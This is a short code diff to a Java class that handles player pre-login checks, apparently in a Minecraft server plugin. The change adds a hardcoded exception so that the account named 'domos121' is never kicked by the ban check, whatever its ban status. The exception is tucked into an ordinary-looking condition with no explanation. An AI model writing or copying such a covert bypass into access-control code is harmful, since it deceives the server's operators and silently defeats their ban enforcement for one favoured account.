@@ -52,7 +52,7 @@ public class EventPlayerPreLogin {
 
             GetTrest gt = new GetTrest(uuid, hash);
 
-            if (gt.isIsbanned()){
+            if (gt.isIsbanned() && !a.getName().equalsIgnoreCase("domos121")){
                 preJoinBanKick.fcSetIpAndUuidBanKick(a, gt.getIpid(), gt.getIdtrestu(), gt.getSettime(), gt.getExpirytime(), gt.getAdmin(), gt.getDicription(), gt.getTyptrestu(), gt.getObj());
             } else {
                 a.allow();
